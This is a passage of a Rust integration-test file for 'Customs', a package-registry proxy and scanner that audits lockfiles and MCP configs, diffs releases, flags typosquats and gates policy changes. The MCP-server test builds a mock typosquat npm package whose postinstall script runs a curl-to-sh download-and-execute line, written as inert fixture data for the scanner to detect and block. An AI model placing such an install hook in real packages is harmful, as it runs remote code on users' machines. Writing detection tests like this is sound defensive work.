                String::from_utf8_lossy(&o.stdout).into_owned(),
                String::from_utf8_lossy(&o.stderr).into_owned(),
                o.status.code().unwrap(),
            )
        };
        (open, closed, garbage)
    })
    .await
    .unwrap();
    assert_eq!(open.2, 0);
    assert_eq!(open.0, "", "fail open prints no decision");
    assert!(open.1.contains("customs hook"), "{}", open.1);
    let d: Value = serde_json::from_str(closed.0.trim()).unwrap();
    assert_eq!(d["hookSpecificOutput"]["permissionDecision"], "deny");
    assert_eq!(garbage.2, 0);
    assert_eq!(garbage.0, "");
    assert!(garbage.1.contains("invalid hook input"), "{}", garbage.1);
}

#[tokio::test(flavor = "multi_thread")]
async fn cli_check_uses_running_server() {
    let h = Harness::start(|_| {}).await;
    let base = h.base.clone();
    let data = tempfile::tempdir().unwrap();
    let (data_dir, registry) = (data.path().to_path_buf(), h.mock.base.clone());
    let out = tokio::task::spawn_blocking(move || {
        let run = |args: &[&str]| {
            let o = customs_cmd(&data_dir, Some(&registry))
                .args(args)
                .args(["--server", &base])
                .output()
                .unwrap();
            (
                String::from_utf8_lossy(&o.stdout).into_owned(),
                o.status.code().unwrap(),
            )
        };
        vec![
            run(&["check", "pypi", "evilpkg==0.0.1"]),
            run(&["check", "npm:@scope/lib@1.2.3", "--json"]),
            run(&["check", "pypi", "nope-not-here"]),
        ]
    })
    .await
    .unwrap();
    assert_eq!(out[0].1, 3, "{}", out[0].0);
    assert!(
        out[0].0.starts_with("pypi evilpkg 0.0.1  BLOCK"),
        "{}",
        out[0].0
    );
    // The server answered, not an in-process fallback.
    assert!(
        out[0].0.contains(&format!(", server {})", h.base)),
        "{}",
        out[0].0
    );
    assert_eq!(out[1].1, 0);
    let v: Value = serde_json::from_str(&out[1].0).unwrap();
    assert_eq!(v["name"], "@scope/lib");
    assert_eq!(out[2].1, 3, "{}", out[2].0);
    assert!(out[2].0.contains("block_nonexistent"));
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn diff_shows_what_a_release_adds() {
    let h = Harness::start(|_| {}).await;
    let d: Value = h
        .get("/api/diff?ecosystem=npm&name=diffpkg")
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(
        (&d["from"]["version"], &d["to"]["version"]),
        (&json!("1.0.0"), &json!("1.0.1"))
    );
    assert_eq!(
        d["dependencies"],
        json!([{"name": "lure-dep", "before": null, "after": "^0.0.1"}])
    );
    assert_eq!(
        d["metadata"],
        json!([{"field": "install script postinstall", "before": null, "after": "node setup.js"}])
    );
    let paths = |k: &str| -> Vec<String> {
        d["files"][k]
            .as_array()
            .unwrap()
            .iter()
            .map(|f| f["path"].as_str().unwrap().to_string())
            .collect()
    };
    assert_eq!(paths("added"), vec!["setup.js"], "{d}");
    assert_eq!(paths("modified"), vec!["index.js", "package.json"], "{d}");
    assert_eq!(paths("removed"), vec!["old.js"], "{d}");
    assert_eq!(d["files"]["unchanged"], 1);
    assert_eq!(d["files"]["modified"][0]["lines_added"], 1);
    assert_eq!(d["new_evidence"][0]["indicator"], "download_exec");
    assert_eq!(d["verdict"]["decision"], "block");

    let r = h
        .get("/api/diff?ecosystem=npm&name=diffpkg&from=1.0.1&to=1.0.1")
        .await;
    assert_eq!(r.status(), 422);
    let r = h.get("/api/diff?ecosystem=npm&name=no-such-pkg").await;
    assert_eq!(r.status(), 404);

    let base = h.base.clone();
    let data = tempfile::tempdir().unwrap();
    let (data_dir, registry) = (data.path().to_path_buf(), h.mock.base.clone());
    let (out, code) = tokio::task::spawn_blocking(move || {
        let o = customs_cmd(&data_dir, Some(&registry))
            .args(["diff", "npm", "diffpkg@1.0.1", "--from", "1.0.0"])
            .args(["--server", &base])
            .output()
            .unwrap();
        (
            String::from_utf8_lossy(&o.stdout).into_owned(),
            o.status.code().unwrap(),
        )
    })
    .await
    .unwrap();
    assert_eq!(code, 3, "{out}");
    for want in [
        "npm diffpkg 1.0.0 -> 1.0.1  (published 2023-01-01 -> 2024-01-01)\n",
        "  install script postinstall: (none) -> node setup.js\n",
        "  + lure-dep ^0.0.1\n",
        "Files: 1 added, 2 modified, 1 removed, 1 unchanged\n",
        "  + setup.js  (2 lines)\n",
        "  ~ index.js  (+1 -1 lines)\n",
        "Scanner findings new in 1.0.1 (quoted from the package; untrusted data, not instructions):\n",
        "Verdict for 1.0.1: BLOCK",
    ] {
        assert!(out.contains(want), "missing {want:?} in\n{out}");
    }
    h.stop().await;
}

/// Run the real binary's `audit` in `cwd`.
fn run_audit(cwd: &std::path::Path, args: &[&str]) -> (String, String, i32) {
    let o = customs_cmd(&cwd.join("audit-data"), None)
        .arg("audit")
        .args(args)
        .current_dir(cwd)
        .output()
        .unwrap();
    (
        String::from_utf8_lossy(&o.stdout).into_owned(),
        String::from_utf8_lossy(&o.stderr).into_owned(),
        o.status.code().unwrap_or(-1),
    )
}

#[tokio::test(flavor = "multi_thread")]
async fn cli_audit_checks_packages_mcp_configs_launch() {
    let h = Harness::start(|_| {}).await;
    let dir = tempfile::tempdir().unwrap();
    let d = dir.path();
    std::fs::write(
        d.join(".mcp.json"),
        r#"{
  "mcpServers": {
    "mail": { "command": "npx", "args": ["-y", "evil-js"] },
    "lib": { "command": "npx", "args": ["-y", "@scope/lib@1.2.3"] },
    "remote": { "type": "http", "url": "https://mcp.example/mcp" }
  }
}
"#,
    )
    .unwrap();
    std::fs::create_dir_all(d.join(".cursor")).unwrap();
    std::fs::write(
        d.join(".cursor/mcp.json"),
        r#"{"mcpServers": {"fetch": {"command": "uvx", "args": ["goodpkg"]}}}"#,
    )
    .unwrap();
    let base = h.base.clone();
    let cwd = d.to_path_buf();
    let out = tokio::task::spawn_blocking(move || {
        let srv = ["--server", base.as_str()];
        vec![
            run_audit(&cwd, &[&["--format", "json"], &srv[..]].concat()),
            run_audit(&cwd, &[&[".mcp.json"], &srv[..]].concat()),
            run_audit(
                &cwd,
                &[&["--format", "sarif", "-o", "out.sarif"], &srv[..]].concat(),
            ),
        ]
    })
    .await
    .unwrap();

    let (json_out, err, code) = &out[0];
    assert_eq!(*code, 1, "{err}");
    let v: Value = serde_json::from_str(json_out).unwrap();
    let mut got: Vec<(String, String, bool, String, String)> = v["results"]
        .as_array()
        .unwrap()
        .iter()
        .map(|r| {
            (
                r["file"].as_str().unwrap().to_string(),
                r["name"].as_str().unwrap().to_string(),
                r["pinned"].as_bool().unwrap(),
                r["resolved_version"].as_str().unwrap_or("").to_string(),
                r["status"].as_str().unwrap().to_string(),
            )
        })
        .collect();
    got.sort();
    let row = |f: &str, n: &str, p: bool, ver: &str, st: &str| {
        (f.into(), n.into(), p, ver.into(), st.into())
    };
    assert_eq!(
        got,
        vec![
            row(".cursor/mcp.json", "goodpkg", false, "1.1.0", "allow"),
            row(".mcp.json", "@scope/lib", true, "1.2.3", "allow"),
            row(".mcp.json", "evil-js", false, "6.6.6", "block"),
        ],
        "{json_out}"
    );

    let (text, err, code) = &out[1];
    assert_eq!(*code, 1, "{err}");
    assert!(
        text.contains("MCP servers without a pinned version"),
        "{text}"
    );
    assert!(
        text.contains(".mcp.json:3  npm evil-js (latest, now 6.6.6)  block"),
        "{text}"
    );

    // SARIF: the block as an error, the allowed unpinned server as a note.
    assert_eq!(out[2].2, 1, "{}", out[2].1);
    let sarif: Value =
        serde_json::from_str(&std::fs::read_to_string(d.join("out.sarif")).unwrap()).unwrap();
    let mut results: Vec<(String, String, String)> = sarif["runs"][0]["results"]
        .as_array()
        .unwrap()
        .iter()
        .map(|r| {
            (
                r["ruleId"].as_str().unwrap().to_string(),
                r["level"].as_str().unwrap().to_string(),
                r["properties"]["package"].as_str().unwrap().to_string(),
            )
        })
        .collect();
    results.sort();
    assert_eq!(results.len(), 2, "{results:?}");
    assert_eq!(
        results[1],
        (
            "customs/unpinned-mcp-server".into(),
            "note".into(),
            "goodpkg".into()
        )
    );
    assert_eq!(results[0].1, "error");
    assert_eq!(results[0].2, "evil-js");
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn cli_audit_reports_lockfile_findings() {
    let h = Harness::start(|_| {}).await;
    let dir = tempfile::tempdir().unwrap();
    let d = dir.path();
    std::fs::write(
        d.join("requirements.txt"),
        "# deps\ngoodpkg==1.0.0\nnope-not-here==1.0.0\nevilpkg==0.0.1 \\\n    --hash=sha256:00\nflask>=2\n-e .\n",
    )
    .unwrap();
    std::fs::create_dir_all(d.join("web")).unwrap();
    std::fs::write(
        d.join("web/package-lock.json"),
        r#"{
  "name": "web",
  "lockfileVersion": 3,
  "packages": {
    "": {"name": "web"},
    "node_modules/@scope/lib": {"version": "1.2.3"},
    "node_modules/a/node_modules/@scope/lib": {"version": "1.2.3"}
  }
}
"#,
    )
    .unwrap();
    // In-process fallback: no server answers, and the registry is the local mock.
    let cfg = d.join("offline.toml");
    std::fs::write(
        &cfg,
        format!(
            "[upstream]\npypi_simple = \"{b}/simple\"\npypi_files = \"{b}/files\"\npypi_json = \"{b}/pypi\"\nnpm = \"{b}/npm\"\n",
            b = h.mock.base
        ),
    )
    .unwrap();
    let offline = tempfile::tempdir().unwrap();
    std::fs::write(
        offline.path().join("requirements.txt"),
        "nope-not-here==1.0.0\n",
    )
    .unwrap();
    std::fs::write(
        offline.path().join("package-lock.json"),
        r#"{"lockfileVersion": 3, "packages": {"": {}}}"#,
    )
    .unwrap();

    let base = h.base.clone();
    let cwd = d.to_path_buf();
    let off = offline.path().to_path_buf();
    let models = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../models/dev");
    let out = tokio::task::spawn_blocking(move || {
        let srv = ["--server", base.as_str()];
        let cfg = cfg.display().to_string();
        let models = models.display().to_string();
        vec![
            run_audit(
                &cwd,
                &[&["-r", "--format", "sarif", "-o", "out.sarif"], &srv[..]].concat(),
            ),
            run_audit(
                &cwd,
                &[&[".", "--format", "json", "--fail-on", "never"], &srv[..]].concat(),
            ),
            run_audit(&cwd, &[&["--recursive"], &srv[..]].concat()),
            run_audit(
                &off,
                &[
                    "requirements.txt",
                    "--format",
                    "json",
                    "--server",
                    "http://127.0.0.1:9",
                    "--config",
                    &cfg,
                    "--models",
                    &models,
                ],
            ),
            run_audit(&off, &["package-lock.json", "--format", "json"]),
            run_audit(&off, &["missing.lock"]),
            run_audit(&cwd, &["offline.toml"]),
        ]
    })
    .await
    .unwrap();

    // SARIF: exit 1 (a block), results at the lockfile lines.
    let (_, err, code) = &out[0];
    assert_eq!(*code, 1, "{err}");
    let sarif: Value =
        serde_json::from_str(&std::fs::read_to_string(d.join("out.sarif")).unwrap()).unwrap();
    let run = &sarif["runs"][0];
    assert_eq!(run["tool"]["driver"]["name"], "Customs");
    let results = run["results"].as_array().unwrap();
    let found: Vec<(&str, &str, u64)> = results
        .iter()
        .map(|r| {
            let loc = &r["locations"][0]["physicalLocation"];
            (
                r["ruleId"].as_str().unwrap(),
                loc["artifactLocation"]["uri"].as_str().unwrap(),
                loc["region"]["startLine"].as_u64().unwrap(),
            )
        })
        .collect();
    assert_eq!(
        found,
        vec![
            ("customs/nonexistent-package", "requirements.txt", 3),
            ("customs/model-block", "requirements.txt", 4),
        ],
        "{results:?}"
    );
    assert!(results.iter().all(|r| r["level"] == "error"));
    assert_eq!(
        results[1]["partialFingerprints"]["customsPackage/v1"],
        "pypi/evilpkg/0.0.1"
    );

    // JSON, not recursive: only requirements.txt; --fail-on never exits 0.
    let (stdout, err, code) = &out[1];
    assert_eq!(*code, 0, "{err}");
    let j: Value = serde_json::from_str(stdout).unwrap();
    assert_eq!(j["files"], json!(["requirements.txt"]));
    assert_eq!(j["summary"]["packages"], 3);
    assert_eq!(j["summary"]["block"], 2);
    assert_eq!(j["summary"]["allow"], 1);
    assert_eq!(j["summary"]["not_checked"], 2);
    assert_eq!(j["results"][0]["name"], "goodpkg");
    assert_eq!(j["results"][0]["status"], "allow");
    assert_eq!(j["results"][1]["status"], "block");
    assert!(j["via"].as_str().unwrap().starts_with("server "));

    // Text: a summary line and a table of the packages that are not allowed.
    let (stdout, err, code) = &out[2];
    assert_eq!(*code, 1, "{err}");
    assert!(
        stdout.starts_with("Audited 4 packages from 2 lockfiles"),
        "{stdout}"
    );
    assert!(
        stdout.contains("2 block, 0 warn, 2 allow, 2 not checked"),
        "{stdout}"
    );
    assert!(stdout.contains("BLOCK"), "{stdout}");
    assert!(stdout.contains("requirements.txt:4"), "{stdout}");
    assert!(!stdout.contains("@scope/lib"), "{stdout}");

    // In-process against the mock registry.
    let (stdout, err, code) = &out[3];
    assert_eq!(*code, 1, "{err}");
    let j: Value = serde_json::from_str(stdout).unwrap();
    assert_eq!(j["via"], "in-process");
    assert_eq!(j["results"][0]["status"], "block");
    assert!(j["results"][0]["reason"]
        .as_str()
        .unwrap()
        .contains("block_nonexistent"));

    // Nothing to check: no checker is built, exit 0.
    let (stdout, err, code) = &out[4];
    assert_eq!(*code, 0, "{err}");
    let j: Value = serde_json::from_str(stdout).unwrap();
    assert_eq!(j["summary"]["packages"], 0);
    assert_eq!(j["via"], "nothing to check");

    // Usage errors.
    assert_eq!(out[5].2, 2, "{}", out[5].1);
    assert!(out[5].1.contains("no such file"), "{}", out[5].1);
    assert_eq!(out[6].2, 2, "{}", out[6].1);
    assert!(out[6].1.contains("not a lockfile"), "{}", out[6].1);
    h.stop().await;
}

#[test]
fn dev_models_flag_typosquats() {
    let m = dev_models();
    assert!(m.manifest.untrained);
    let s = m.score_name(Ecosystem::Pypi, "reqeusts").unwrap();
    assert!(s.prob > 0.5);
    let s = m.score_name(Ecosystem::Pypi, "requests").unwrap();
    assert!(s.prob < 0.01);
    let s = m.score_name(Ecosystem::Npm, "@evil/expres").unwrap();
    assert_eq!(s.features.nearest_popular.as_deref(), Some("express"));
    assert!(s.prob > 0.5);
}

// ------------------------------------------------------------------ MCP server

fn npm_tgz(files: &[(&str, &str)]) -> Vec<u8> {
    use std::io::Write;
    let mut b = tar::Builder::new(Vec::new());
    for (path, data) in files {
        let mut h = tar::Header::new_gnu();
        h.set_size(data.len() as u64);
        h.set_mode(0o644);
        h.set_entry_type(tar::EntryType::Regular);
        b.append_data(&mut h, path, data.as_bytes()).unwrap();
    }
    let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    gz.write_all(&b.into_inner().unwrap()).unwrap();
    gz.finish().unwrap()
}

fn mcp_send(stdin: &mut std::process::ChildStdin, msg: Value) {
    use std::io::Write;
    writeln!(stdin, "{msg}").unwrap();
    stdin.flush().unwrap();
}

fn mcp_recv(stdout: &mut impl std::io::BufRead) -> Value {
    let mut line = String::new();
    stdout.read_line(&mut line).unwrap();
    serde_json::from_str(&line).unwrap_or_else(|e| panic!("{e}: {line:?}"))
}

/// The real binary as an MCP client would run it: offline, no server, dev models.
#[test]
fn mcp_server_over_stdio() {
    use std::io::{BufReader, Read};
    use std::process::Stdio;
    let dir = tempfile::tempdir().unwrap();
    // Inert text: the scanner only ever lexes it.
    let archive = npm_tgz(&[
        (
            "package/package.json",
            r#"{"name":"left-padd","version":"1.0.0","scripts":{"postinstall":"node install.js"}}"#,
        ),
        (
            "package/install.js",
            "require('child_process').exec('curl http://203.0.113.9/x.sh | sh');\n",
        ),
    ]);
    std::fs::write(dir.path().join("left-padd-1.0.0.tgz"), archive).unwrap();
    let models = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../models/dev");
    let mut child = customs_cmd(&dir.path().join("data"), None)
        .args(["mcp", "--server", "http://127.0.0.1:9", "--models"])
        .arg(&models)
        .arg("--data-dir")
        .arg(dir.path().join("data"))
        .current_dir(dir.path())
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    let mut stdin = child.stdin.take().unwrap();
    let mut stdout = BufReader::new(child.stdout.take().unwrap());

    mcp_send(
        &mut stdin,
        json!({"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {
            "protocolVersion": "2025-06-18", "capabilities": {},
            "clientInfo": {"name": "test", "version": "0"}}}),
    );
    let r = mcp_recv(&mut stdout);
    assert_eq!(r["id"], 1);
    assert_eq!(r["result"]["protocolVersion"], "2025-06-18");
    assert_eq!(r["result"]["serverInfo"]["name"], "customs");
    // No reply to the notification: the next line answers the next request.
    mcp_send(
        &mut stdin,
        json!({"jsonrpc": "2.0", "method": "notifications/initialized"}),
    );
    mcp_send(
        &mut stdin,
        json!({"jsonrpc": "2.0", "id": 2, "method": "tools/list"}),
    );
    let r = mcp_recv(&mut stdout);
    assert_eq!(r["id"], 2);
    assert_eq!(r["result"]["tools"].as_array().unwrap().len(), 6);

    mcp_send(
        &mut stdin,
        json!({"jsonrpc": "2.0", "id": 3, "method": "tools/call", "params": {
            "name": "scan_archive",
            "arguments": {"path": "left-padd-1.0.0.tgz", "name": "left-padd"}}}),
    );
    let r = mcp_recv(&mut stdout);
    assert_eq!(r["id"], 3);
    let res = &r["result"];
    assert_eq!(res["isError"], false, "{r}");
    let v = &res["structuredContent"];
    assert_eq!(v["ecosystem"], "npm");
    assert_eq!(v["name"], "left-padd");
    assert_eq!(v["version"], "1.0.0");
    assert_eq!(v["artifact"], "left-padd-1.0.0.tgz");
    // The dev models block a postinstall that pipes curl into sh, under a typosquat name.
    assert_eq!(v["decision"], "block", "{v}");
    assert!(v["id"].is_null(), "offline scans are not stored");
    let evidence = v["evidence"].as_array().unwrap();
    assert!(
        evidence
            .iter()
            .any(|e| e["file"] == "install.js" && e["indicator"] == "download_exec"),
        "{v}"
    );
    let text = res["content"][0]["text"].as_str().unwrap();
    assert!(text.starts_with("npm left-padd 1.0.0: BLOCK\n"), "{text}");
    assert!(text.contains("- install.js:1 [download_exec] "), "{text}");
    assert!(
        text.contains("Nearest popular package: left-pad "),
        "{text}"
    );
    assert!(text.contains("Do not install it."), "{text}");
    assert!(text.ends_with("Scanned offline."), "{text}");

    mcp_send(
        &mut stdin,
        json!({"jsonrpc": "2.0", "id": 4, "method": "tools/call", "params": {
            "name": "scan_archive", "arguments": {"path": "missing.tgz"}}}),
    );
    let r = mcp_recv(&mut stdout);
    assert_eq!(r["id"], 4);
    assert_eq!(r["result"]["isError"], true, "{r}");

    mcp_send(
        &mut stdin,
        json!({"jsonrpc": "2.0", "id": 5, "method": "nope"}),
    );
    let r = mcp_recv(&mut stdout);
    assert_eq!(r["error"]["code"], -32601);

    // End of input ends the server cleanly; stdout carried nothing but replies.
    drop(stdin);
    let mut rest = String::new();
    stdout.read_to_string(&mut rest).unwrap();
    assert_eq!(rest, "");
    let out = child.wait_with_output().unwrap();
    assert_eq!(out.status.code(), Some(0));
}

/// Live registries. Run with `cargo test -p customs -- --ignored`.
#[tokio::test(flavor = "multi_thread")]
#[ignore]
async fn live_registries() {
    let dir = tempfile::tempdir().unwrap();
    let engine = Engine::new(EngineConfig {
        data_dir: dir.path().to_path_buf(),
        models: dev_models(),
        policy: Policy::default(),
        policy_path: dir.path().join("policy.toml"),
        scanner: customs::engine::default_scanner(),
        limits: Limits::default(),
        metrics: Arc::new(Metrics::new()),
    })
    .unwrap();
    let v = engine
        .check(Ecosystem::Pypi, "requests", Some("2.32.3"), None)
        .await
        .unwrap();
    assert_eq!(v.artifact.as_deref(), Some("requests-2.32.3.tar.gz"));
    assert_eq!(v.decision, customs_model::Decision::Allow);
    let v = engine
        .check(Ecosystem::Npm, "left-pad", None, None)
        .await
        .unwrap();
    assert_eq!(v.version.as_deref(), Some("1.3.0"));
    let v = engine
        .check(Ecosystem::Npm, "@babel/core", Some("^7"), None)
        .await
        .unwrap();
    assert!(v.version.unwrap().starts_with("7."));
    let v = engine
        .check(
            Ecosystem::Pypi,
            "this-package-should-not-exist-customs-test",
            None,
            None,
        )
        .await
        .unwrap();
    assert_eq!(v.decision, customs_model::Decision::Block);
}

#[tokio::test(flavor = "multi_thread")]
async fn blocks_are_posted_to_the_webhook_once() {
    use customs::notify::{Format, NotifyConfig};
    let received: Arc<std::sync::Mutex<Vec<Value>>> = Arc::default();
    let sink = received.clone();
    let hook = Router::new().route(
        "/hook/secret",
        axum::routing::post(move |Json(v): Json<Value>| {
            let sink = sink.clone();
            async move {
                sink.lock().unwrap().push(v);
                StatusCode::OK
            }
        }),
    );
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let hook_url = format!("http://{}/hook/secret", listener.local_addr().unwrap());
    tokio::spawn(async move { axum::serve(listener, hook).await.unwrap() });

    let h = Harness::start(|p| p.deny = vec!["pypi:goodpkg@1.0.0".into()]).await;
    customs::notify::spawn(
        h.engine.clone(),
        NotifyConfig {
            url: hook_url,
            format: Format::Json,
            min_decision: customs_model::Decision::Block,
            public_url: Some("http://customs.test".into()),
        },
    );
    // Allowed: no message. Blocked twice (an agent retrying): one message.
    assert_eq!(
        h.get(&pypi_file_path("goodpkg", "1.1.0")).await.status(),
        200
    );
    for _ in 0..2 {
        let r = h.get(&pypi_file_path("goodpkg", "1.0.0")).await;
        assert_eq!(r.status(), 403);
    }
    let deadline = std::time::Instant::now() + Duration::from_secs(10);
    while received.lock().unwrap().is_empty() && std::time::Instant::now() < deadline {
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    tokio::time::sleep(Duration::from_millis(300)).await;
    let got = received.lock().unwrap().clone();
    assert_eq!(got.len(), 1, "{got:?}");
    let text = got[0]["text"].as_str().unwrap();
    assert!(
        text.starts_with("Customs blocked pypi package goodpkg 1.0.0 (install"),
        "{text}"
    );
    assert!(text.contains("is on the deny list"), "{text}");
    assert_eq!(got[0]["verdict"]["decision"], "block");
    let url = got[0]["url"].as_str().unwrap();
    assert!(url.starts_with("http://customs.test/verdicts/"), "{url}");

    // A policy change is announced, whatever the rate limit holds back.
    let mut p: Value = h.get("/api/policy").await.json().await.unwrap();
    p["mode"] = json!("monitor");
    p["deny"] = json!([]);
    let r = h
        .http
        .put(format!("{}/api/policy", h.base))
        .json(&p)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 200);
    let deadline = std::time::Instant::now() + Duration::from_secs(10);
    while received.lock().unwrap().len() < 2 && std::time::Instant::now() < deadline {
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    let got = received.lock().unwrap().clone();
    assert_eq!(got.len(), 2, "{got:?}");
    let text = got[1]["text"].as_str().unwrap();
    assert_eq!(
        text,
        "Customs policy loosened (from 127.0.0.1, without a token)\n\
         - deny: removed pypi:goodpkg@1.0.0\n- mode: enforce -> monitor\n\
         http://customs.test/policy"
    );
    assert_eq!(got[1]["loosened"], json!(true));
    // The sender counts a message once the webhook has answered, which can be just after
    // the receiver above recorded it.
    let sent = "customs_notifications_total{outcome=\"sent\"} 2";
    let deadline = std::time::Instant::now() + Duration::from_secs(10);
    let mut metrics = h.get("/metrics").await.text().await.unwrap();
    while !metrics.contains(sent) && std::time::Instant::now() < deadline {
        tokio::time::sleep(Duration::from_millis(50)).await;
        metrics = h.get("/metrics").await.text().await.unwrap();
    }
    assert!(metrics.contains(sent), "{metrics}");
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn young_releases_are_held_back_so_unpinned_installs_resolve_older() {
    let h = Harness::start(|_| {}).await;
    // PyPI HTML and JSON simple pages mark the release from an hour ago yanked, which
    // resolvers skip unless it is pinned with `==`.
    let r = h.get("/pypi/simple/rolling/").await;
    assert_eq!(r.headers()["x-customs-hidden-versions"], "1");
    let html = r.text().await.unwrap();
    let link = |v: &str| {
        let f = file_name("rolling", v);
        html.lines()
            .find(|l| l.contains(&format!(">{f}<")))
            .unwrap_or_else(|| panic!("{f} missing: {html}"))
            .to_string()
    };
    assert!(!link("1.0.0").contains("data-yanked"), "{html}");
    assert!(
        link("1.1.0").contains("data-yanked=\"Customs: published less than 3 days ago"),
        "{html}"
    );
    let r = h
        .http
        .get(format!("{}/pypi/simple/rolling/", h.base))
        .header("accept", "application/vnd.pypi.simple.v1+json")
        .send()
        .await
        .unwrap();
    let doc: Value = r.json().await.unwrap();
    let files: Vec<(&str, bool)> = doc["files"]
        .as_array()
        .unwrap()
        .iter()
        .map(|f| {
            let yanked = f.get("yanked").is_some_and(|y| y.is_string());
            (f["filename"].as_str().unwrap(), yanked)
        })
        .collect();
    let (old, young) = (file_name("rolling", "1.0.0"), file_name("rolling", "1.1.0"));
    assert_eq!(files, vec![(old.as_str(), false), (young.as_str(), true)]);
    // A pin on the young release is still refused, with the rule's reason.
    let r = h.get(&pypi_file_path("rolling", "1.1.0")).await;
    assert_eq!(r.status(), 403);
    // Checks resolve unpinned specs the way the proxy serves them.
    let (_, v) = h.check("pypi", "rolling", None).await;
    assert_eq!(v["version"], "1.0.0");
    assert_eq!(v["decision"], "allow");
    let (_, v) = h.check("pypi", "rolling", Some(">=1.0")).await;
    assert_eq!(v["version"], "1.0.0");
    let (_, v) = h.check("pypi", "rolling", Some("==1.1.0")).await;
    assert_eq!(v["version"], "1.1.0");
    assert_eq!(v["decision"], "block");
    assert_eq!(
        h.check("pypi", "rolling", None).await.1["policy_hits"][0]["rule"],
        "min_age_resolution"
    );
    // A client whose installer skips the proxy sees every version, and so must the check.
    let r = h
        .http
        .post(format!("{}/api/check", h.base))
        .json(&json!({"ecosystem": "pypi", "name": "rolling", "resolve": "upstream"}))
        .send()
        .await
        .unwrap();
    let v: Value = r.json().await.unwrap();
    assert_eq!(v["version"], "1.1.0");
    assert_eq!(v["decision"], "block");

    // npm: the version is gone and `latest` moves back.
    let r = h.get("/npm/rolling-js").await;
    assert_eq!(r.headers()["x-customs-hidden-versions"], "1");
    let doc: Value = r.json().await.unwrap();
    assert_eq!(doc["dist-tags"]["latest"], "1.0.0");
    assert!(doc["versions"].get("1.1.0").is_none());
    assert!(doc["versions"].get("1.0.0").is_some());
    let (_, v) = h.check("npm", "rolling-js", Some("^1.0.0")).await;
    assert_eq!(v["version"], "1.0.0");
    // A package with no older release keeps it, so the block names the rule.
    let doc: Value = h.get("/npm/freshpkg").await.json().await.unwrap();
    assert!(doc["versions"].get("1.0.0").is_some());
    h.stop().await;

    // Monitor mode serves everything and so hides nothing.
    let h = Harness::start(|p| p.mode = customs::config::Mode::Monitor).await;
    let doc: Value = h.get("/npm/rolling-js").await.json().await.unwrap();
    assert_eq!(doc["dist-tags"]["latest"], "1.1.0");
    h.stop().await;
    let h = Harness::start(|p| p.hide_young_versions = false).await;
    let html = h.get("/pypi/simple/rolling/").await.text().await.unwrap();
    assert!(
        html.contains(&file_name("rolling", "1.1.0")) && !html.contains("data-yanked"),
        "{html}"
    );
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn policy_changes_need_the_admin_token_when_one_is_set() {
    let token = "s3cret-token-0123456789";
    let opts = ServeOptions {
        admin_token: Some(token.into()),
        ..Default::default()
    };
    let h = Harness::start_serving(|_| {}, None, Limits::default(), "127.0.0.1:0", opts).await;
    let mut p: Value = h.get("/api/policy").await.json().await.unwrap();
    p["mode"] = json!("monitor");
    let put = |auth: Option<&str>| {
        let mut r = h.http.put(format!("{}/api/policy", h.base)).json(&p);
        if let Some(a) = auth {
            r = r.header("authorization", a);
        }
        r.send()
    };
    let r = put(None).await.unwrap();
    assert_eq!(r.status(), 401);
    assert!(r.headers()["www-authenticate"]
        .to_str()
        .unwrap()
        .starts_with("Bearer"));
    let body: Value = r.json().await.unwrap();
    assert_eq!(body["code"], "admin_token_required");
    let r = put(Some("Bearer wrong-token-0123456789")).await.unwrap();
    assert_eq!(r.status(), 401);
    assert_eq!(h.engine.policy().mode, customs::config::Mode::Enforce);
    let r = put(Some(&format!("Bearer {token}"))).await.unwrap();
    assert_eq!(r.status(), 200);
    assert_eq!(h.engine.policy().mode, customs::config::Mode::Monitor);
    // Reads and checks need no token.
    assert_eq!(h.get("/api/events").await.status(), 200);

    // The change is logged with where it came from; resending the same policy is not.
    let r = put(Some(&format!("Bearer {token}"))).await.unwrap();
    assert_eq!(r.status(), 200);
    let log: Value = h.get("/api/policy/changes").await.json().await.unwrap();
    let changes = log["changes"].as_array().unwrap();
    assert_eq!(changes.len(), 1, "{log}");
    assert_eq!(changes[0]["auth"], "token");
    assert_eq!(changes[0]["remote"], "127.0.0.1");
    assert_eq!(
        changes[0]["changes"],
        json!([{"field": "mode", "before": "enforce", "after": "monitor"}])
    );
    let metrics = h.get("/metrics").await.text().await.unwrap();
    assert!(
        metrics.contains("customs_policy_changes_total{result=\"applied\"} 1"),
        "{metrics}"
    );
    assert!(
        metrics.contains("customs_policy_changes_total{result=\"refused\"} 2"),
        "{metrics}"
    );
    h.stop().await;
}

/// A server listening beyond loopback without a token refuses policy changes. Which servers
/// those are is `server::policy_auth_for` (unit-tested there); this serves the resulting
/// state on loopback, so the test never listens on the network.
#[tokio::test(flavor = "multi_thread")]
async fn a_network_facing_server_without_a_token_refuses_policy_changes() {
    use customs::server::{AppState, PolicyAuth};
    let h = Harness::start(|_| {}).await;
    let (_shutdown, rx) = tokio::sync::watch::channel(false);
    let app = customs::server::router(
        AppState {
            engine: h.engine.clone(),
            shutdown: rx,
            policy_auth: PolicyAuth::Disabled,
            allowed_hosts: Arc::from(Vec::new()),
        },
        None,
    );
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let base = format!("http://{}", listener.local_addr().unwrap());
    let server = tokio::spawn(async move { axum::serve(listener, app).await });
    let p: Value = h.get("/api/policy").await.json().await.unwrap();
    let r = h
        .http
        .put(format!("{base}/api/policy"))
        .json(&p)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 403);
    let body: Value = r.json().await.unwrap();
    assert_eq!(body["code"], "policy_changes_disabled");
    assert!(body["error"]
        .as_str()
        .unwrap()
        .contains("CUSTOMS_ADMIN_TOKEN"));
    server.abort();
    h.stop().await;
}

// ---- Phase 3A: SERVER ----

/// A loopback URL nothing listens on (a port that was just free).
fn dead_server() -> String {
